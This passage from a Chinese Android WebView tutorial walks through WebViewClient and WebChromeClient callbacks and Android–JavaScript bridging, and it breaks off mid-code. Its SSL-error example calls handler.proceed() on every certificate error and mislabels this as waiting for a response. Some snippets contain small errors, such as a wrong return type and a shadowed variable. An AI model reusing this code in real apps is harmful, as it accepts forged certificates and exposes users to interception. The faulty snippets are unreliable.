java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>()&#123;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">onPageStarted</span><span class="params">(WebView view, String url, Bitmap favicon)</span> &#123;</span><br><span class="line">        <span class="comment">//设定加载开始的操作</span></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;);</span><br></pre></td></tr></table></figure><p><strong>onLoadResource()</strong></p><p>作用：在加载页面资源时会调用，每一个资源（比如图片）的加载都会调用一次。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>()&#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onLoadResource</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">         <span class="comment">//设定加载资源的操作</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p><strong>onReceivedError（）</strong></p><p>作用：加载页面的服务器出现错误时（如404）调用。</p><p>App里面使用webview控件的时候遇到了诸如404这类的错误的时候，若也显示浏览器里面的那种错误提示页面就显得很丑陋了，那么这个时候我们的app就需要加载一个本地的错误提示页面，即webview如何加载一个本地的页面</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//步骤1：写一个html文件（error_handle.html），用于出错时展示给用户看的提示页面</span></span><br><span class="line"><span class="comment">//步骤2：将该html文件放置到代码根目录的assets文件夹下</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//步骤3：复写WebViewClient的onRecievedError方法</span></span><br><span class="line"><span class="comment">//该方法传回了错误码，根据错误类型可以进行不同的错误分类处理</span></span><br><span class="line">    webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>()&#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceivedError</span><span class="params">(WebView view, <span class="type">int</span> errorCode, String description, String failingUrl)</span>&#123;</span><br><span class="line"><span class="keyword">switch</span>(errorCode)</span><br><span class="line">                &#123;</span><br><span class="line">                <span class="keyword">case</span> HttpStatus.SC_NOT_FOUND:</span><br><span class="line">                    view.loadUrl(<span class="string">&quot;file:///android_assets/error_handle.html&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>onReceivedSslError()</strong></p><p>作用：处理https请求</p><p>webView默认是不处理https请求的，页面显示空白，需要进行如下设置：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>() &#123;    </span><br><span class="line">        <span class="meta">@Override</span>    </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceivedSslError</span><span class="params">(WebView view, SslErrorHandler handler, SslError error)</span> &#123;    </span><br><span class="line">            handler.proceed();    <span class="comment">//表示等待证书响应</span></span><br><span class="line">        <span class="comment">// handler.cancel();      //表示挂起连接，为默认方式</span></span><br><span class="line">        <span class="comment">// handler.handleMessage(null);    //可做其他处理</span></span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;);    </span><br></pre></td></tr></table></figure><p><strong>c.WebChromeClient</strong></p><p>作用：辅助 WebView 处理 Javascript 的对话框,网站图标,网站标题等等。</p><p> <strong>onProgressChanged（）</strong></p><p>作用：获得网页的加载进度并显示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">webview.setWebChromeClient(<span class="keyword">new</span> <span class="title class_">WebChromeClient</span>()&#123;</span><br><span class="line"></span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onProgressChanged</span><span class="params">(WebView view, <span class="type">int</span> newProgress)</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (newProgress &lt; <span class="number">100</span>) &#123;</span><br><span class="line">              <span class="type">String</span> <span class="variable">progress</span> <span class="operator">=</span> newProgress + <span class="string">&quot;%&quot;</span>;</span><br><span class="line">              progress.setText(progress);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p><strong>onReceivedTitle（）</strong></p><p>作用：获取Web页中的标题</p><p>每个网页的页面都有一个标题，比如<a href="http://www.baidu.com这个页面的标题即“百度一下，你就知道”，那么如何知道当前webview正在加载的页面的title并进行设置呢？">www.baidu.com这个页面的标题即“百度一下，你就知道”，那么如何知道当前webview正在加载的页面的title并进行设置呢？</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">webview.setWebChromeClient(<span class="keyword">new</span> <span class="title class_">WebChromeClient</span>()&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceivedTitle</span><span class="params">(WebView view, String title)</span> &#123;</span><br><span class="line">       titleview.setText(title)；</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="（3）WebView与JS的交互"><a href="#（3）WebView与JS的交互" class="headerlink" title="（3）WebView与JS的交互"></a>（3）WebView与JS的交互</h4><p>Android WebView与JS的交互：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/5.png" alt="image-20220726171737615"></p><h5 id="lt-1-gt-Android调用JS"><a href="#lt-1-gt-Android调用JS" class="headerlink" title="&lt;1&gt;Android调用JS"></a>&lt;1&gt;Android调用JS</h5><p><strong><code>WebView.loadUrl()</code></strong></p><p>首先，准备html文件，放到assets中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">function</span> <span class="title function_">callJS</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="title function_">alert</span>(<span class="string">&quot;Android调用了JS的callJS方法&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Android调用JS方法测试<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/8.png" alt="image-20220729093637679"></p><p>然后在Java层中添加代码，进行调用JS文件以及JS中的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置与Js交互的权限</span></span><br><span class="line"> webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"> <span class="comment">// 设置允许JS弹窗</span></span><br><span class="line"> webSettings.setJavaScriptCanOpenWindowsAutomatically(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 先载入JS代码</span></span><br><span class="line"> <span class="comment">// 格式规定为:file:///android_asset/文件名.html</span></span><br><span class="line"> mWebView.loadUrl(<span class="string">&quot;file:///android_asset/AndroJs.html&quot;</span>);</span><br><span class="line"></span><br><span class="line"> <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> (Button) findViewById(R.id.button);</span><br><span class="line"> button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">         <span class="comment">// 通过Handler发送消息</span></span><br><span class="line">         mWebView.post(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">             <span class="meta">@Override</span></span><br><span class="line">             <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">                 <span class="comment">// 注意调用的JS方法名要对应上</span></span><br><span class="line">                 <span class="comment">// 调用javascript的callJS()方法</span></span><br><span class="line">                 mWebView.loadUrl(<span class="string">&quot;javascript:callJS()&quot;</span>);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;);</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 由于设置了弹窗检验调用结果,所以需要支持js对话框</span></span><br><span class="line"> <span class="comment">// webview只是载体，内容的渲染需要使用webviewChromClient类去实现</span></span><br><span class="line"> <span class="comment">// 通过设置WebChromeClient对象处理JavaScript的对话框</span></span><br><span class="line"> <span class="comment">//设置响应js 的Alert()函数</span></span><br><span class="line"> mWebView.setWebChromeClient(<span class="keyword">new</span> <span class="title class_">WebChromeClient</span>() &#123;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onJsAlert</span><span class="params">(WebView view, String url, String message, <span class="keyword">final</span> JsResult result)</span> &#123;</span><br><span class="line">         AlertDialog.<span class="type">Builder</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AlertDialog</span>.Builder(MainActivity.<span class="built_in">this</span>);</span><br><span class="line">         b.setTitle(<span class="string">&quot;Alert&quot;</span>);</span><br><span class="line">         b.setMessage(message);</span><br><span class="line">         b.setPositiveButton(android.R.string.ok, <span class="keyword">new</span> <span class="title class_">DialogInterface</span>.OnClickListener() &#123;</span><br><span class="line">             <span class="meta">@Override</span></span><br><span class="line">             <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(DialogInterface dialog, <span class="type">int</span> which)</span> &#123;</span><br><span class="line">                 result.confirm();</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;);</span><br><span class="line">         b.setCancelable(<span class="literal">false</span>);</span><br><span class="line">         b.create().show();</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"> &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>效果演示：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/9.png" alt="image-20220729093932401"></p><p>我们可以发现程序成功的加载了html文件，然后我们点击按钮去调用js中的方法</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/10.png" alt="image-20220729094015144"></p><p>这里就成功的通过loadUrl进行了调用</p><p><strong>特别注意：JS代码调用一定要在 <code>onPageFinished（）</code> 回调之后才能调用，否则不会调用</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onPageFinished()属于WebViewClient类的方法，主要在页面加载结束时调用</span><br></pre></td></tr></table></figure><p><strong>WebView.evaluateJavascript()</strong></p><p>优点：该方法比第一种方法效率更高、使用更简洁</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">因为该方法的执行不会使页面刷新，而第一种方法（loadUrl ）的执行则会。</span><br><span class="line">Android <span class="number">4.4</span> 后才可使用</span><br></pre></td></tr></table></figure><p>具体使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用evaluateJavascript来加载</span></span><br><span class="line">mWebView.evaluateJavascript(<span class="string">&quot;javascript:callJS()&quot;</span>, <span class="keyword">new</span> <span class="title class_">ValueCallback</span>&lt;String&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceiveValue</span><span class="params">(String value)</span> &#123;</span><br><span class="line">        <span class="comment">//此处为 js 返回的结果</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/11.png" alt="image-20220729094734817"></p><p>同样加载成功</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/12.png" alt="image-20220729094802205"></p><h5 id="lt-2-gt-JS调用Android"><a href="#lt-2-gt-JS调用Android" class="headerlink" title="&lt;2&gt;JS调用Android"></a>&lt;2&gt;JS调用Android</h5><p><strong><code>addJavascriptInterface</code></strong></p><p>首先，准备html文件，放到assets中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//JS调用Android</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Carson<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         <span class="keyword">function</span> <span class="title function_">callAndroid</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="comment">//由于对象映射，所以调用test对象等于调用Android映射的对象</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            test.<span class="title function_">hello</span>(<span class="string">&quot;WindXaa js调用了android中的hello方法&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="comment">&lt;!--点击按钮则调用callAndroid函数--&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;button1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;callAndroid()&quot;</span>&gt;</span>Click Attack<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/13.png" alt="image-20220729100734122"></p><p>然后加载调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JsToAndroActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_js_to_andro);</span><br><span class="line"></span><br><span class="line">        <span class="type">WebView</span> <span class="variable">mWebView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview1);</span><br><span class="line">        <span class="type">WebSettings</span> <span class="variable">webSettings</span> <span class="operator">=</span> mWebView.getSettings();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置与Js交互的权限</span></span><br><span class="line">        webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过addJavascriptInterface()将Java对象映射到JS对象</span></span><br><span class="line">        <span class="comment">//参数1：Javascript对象名</span></span><br><span class="line">        <span class="comment">//参数2：Java对象名</span></span><br><span class="line">        mWebView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">AndroidtoJs</span>(), <span class="string">&quot;test&quot;</span>);<span class="comment">//AndroidtoJS类对象映射到js的test对象</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加载JS代码</span></span><br><span class="line">        <span class="comment">// 格式规定为:file:///android_asset/文件名.html</span></span><br><span class="line">        mWebView.loadUrl(<span class="string">&quot;file:///android_asset/javascript.html&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 提供接口在Webview中供JS调用</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AndroidtoJs</span> &#123;</span><br><span class="line">        <span class="comment">// 定义JS需要调用的方法，被JS调用的方法必须加入@JavascriptInterface注解</span></span><br><span class="line">        <span class="meta">@JavascriptInterface</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">            Log.e(<span class="string">&quot;WindXaa&quot;</span>,<span class="string">&quot;Hello，&quot;</span> + msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们切换到第二个测试用例</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/14.png" alt="image-20220729100854323"></p><p>直接点击</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/15.png" alt="image-20220729100914639"></p><p>此时已经成功的加载了我们的JS，我们点击按钮</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/16.png" alt="image-20220729101013208"></p><p>js中就成功的加载了Android中的hello方法</p><p><strong><code>WebViewClient.shouldOverrideUrlLoading ()</code></strong></p><p>具体原理：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)Android通过 WebViewClient 的回调方法shouldOverrideUrlLoading ()拦截 url</span><br><span class="line">(<span class="number">2</span>)解析该 url 的协议</span><br><span class="line">(<span class="number">3</span>)如果检测到是预先约定好的协议，就调用相应方法</span><br></pre></td></tr></table></figure><p>即JS需要调用Android的方法</p><p>具体使用：</p><p>首先，在JS中约定所需要的Url协议，以.html格式放到src&#x2F;main&#x2F;assets文件夹里</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Carson_Ho&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script&gt;</span><br><span class="line">         function <span class="title function_">callAndroid</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="comment">/*约定的url协议为：js://webview?arg1=WindXaa&amp;arg2=attack*/</span></span><br><span class="line">            document.location = <span class="string">&quot;js://webview?arg1=WindXaa&amp;arg2=attack&quot;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">      &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 点击按钮则调用callAndroid（）方法  --&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;button type=<span class="string">&quot;button&quot;</span> id=<span class="string">&quot;button1&quot;</span> onclick=<span class="string">&quot;callAndroid()&quot;</span>&gt;点击调用Android代码&lt;/button&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后我们新建一个类，并编写代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">     <span class="type">WebView</span> <span class="variable">mWebView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview2);</span><br><span class="line"></span><br><span class="line">        <span class="type">WebSettings</span> <span class="variable">webSettings</span> <span class="operator">=</span> mWebView.getSettings();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置与Js交互的权限</span></span><br><span class="line">        webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 设置允许JS弹窗</span></span><br><span class="line">        webSettings.setJavaScriptCanOpenWindowsAutomatically(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 步骤1：加载JS代码</span></span><br><span class="line">        <span class="comment">// 格式规定为:file:///android_asset/文件名.html</span></span><br><span class="line">        mWebView.loadUrl(<span class="string">&quot;file:///android_asset/javascript1.html&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 复写WebViewClient类的shouldOverrideUrlLoading方法</span></span><br><span class="line">        mWebView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>() &#123;</span><br><span class="line">                                      <span class="meta">@Override</span></span><br><span class="line">                                      <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line"></span><br><span class="line">                                          <span class="comment">// 步骤2：根据协议的参数，判断是否是所需要的url</span></span><br><span class="line">                                          <span class="comment">// 一般根据scheme（协议格式） &amp; authority（协议名）判断（前两个参数）</span></span><br><span class="line">                                          <span class="comment">//约定的url协议为：js://webview?arg1=WindXaa&amp;arg2=attack（同时也是约定好的需要拦截的）</span></span><br><span class="line"></span><br><span class="line">                                          <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(url);</span><br><span class="line">                                          <span class="comment">// 如果url的协议 = 预先约定的 js 协议</span></span><br><span class="line">                                          <span class="comment">// 就解析往下解析参数</span></span><br><span class="line">                                          <span class="keyword">if</span> ( uri.getScheme().equals(<span class="string">&quot;js&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                                              <span class="comment">// 如果 authority  = 预先约定协议里的 webview，即代表都符合约定的协议</span></span><br><span class="line">                                              <span class="comment">// 所以拦截url,下面JS开始调用Android需要的方法</span></span><br><span class="line">                                              <span class="keyword">if</span> (uri.getAuthority().equals(<span class="string">&quot;webview&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                                                  <span class="comment">//  步骤3：</span></span><br><span class="line">                                                  <span class="comment">// 执行JS所需要调用的逻辑</span></span><br><span class="line">                                                  System.out.println(<span class="string">&quot;js调用了Android的方法&quot;</span>);</span><br><span class="line">                                                  <span class="comment">// 